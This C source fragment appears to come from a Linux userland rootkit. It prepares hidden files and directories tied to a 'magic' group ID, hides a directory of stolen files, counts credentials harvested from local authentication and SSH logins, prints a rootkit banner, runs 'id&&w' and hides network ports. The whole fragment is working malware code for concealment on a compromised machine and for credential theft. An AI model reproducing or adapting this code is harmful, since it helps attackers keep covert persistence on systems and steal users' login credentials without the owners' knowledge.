#if defined LOG_LOCAL_AUTH || defined LOG_SSH
int logcount(const char *path){
    FILE *fp;
    char buf[LINE_MAX];
    int count=0;

    hook(CFOPEN);

    fp = call(CFOPEN, path, "r");
    if(fp == NULL) return 0;

    while(fgets(buf, sizeof(buf), fp) != NULL && strlen(buf)<=1)
        count++;

    fclose(fp);
    return count;
}
#endif

void dorolfpls(void){
    char *curpath;
    gid_t magicgid = readgid();
    int dirs=0, regs=0;
    for(int i = 0; i != TOGPATHS_SIZE; i++){
        curpath = togpaths[i];

        if(curpath[strlen(curpath)-1] == '/'){
            if(preparedir(curpath, magicgid))
                dirs++;
            continue;
        }

        if(prepareregfile(curpath, magicgid))
            regs++;
    }

#ifdef FILE_STEAL
    hidedircontents(INTEREST_DIR, magicgid);
#endif

    if(regs+dirs != TOGPATHS_SIZE)
        printf("\e[1mIt looks like something may have went wrong setting everything up...\e[0m\n");
    else{
#ifndef NO_ROOTKIT_ANSI
        printf("\033[0;31m");
        for(int i = 0; i != BDANSI_SIZE; i++)
            printf("%c", bdansi[i]);
        printf("\033[0m\n");
#endif
        size_t rolfsize = sizeofarr(rolfs);
        srand(time(NULL));
        char *randrolf = rolfs[rand() % rolfsize];
        printf("\e[1;31m%s\e[0m\n", randrolf);
        system("id&&w");
#ifdef LOG_LOCAL_AUTH
        int authc = logcount(LOG_PATH);
        if(authc>0) printf("\e[1mLogged accounts: \e[1;31m%d\e[0m\n", authc);
#endif
#ifdef LOG_SSH
        int sshc = logcount(SSH_LOGS);
        if(sshc>0) printf("\e[1mSSH logs: \e[1;31m%d\e[0m\n", sshc);
#endif
    }

#ifdef HIDE_PORTS
    prepareports();
#endif
    exit(0);
}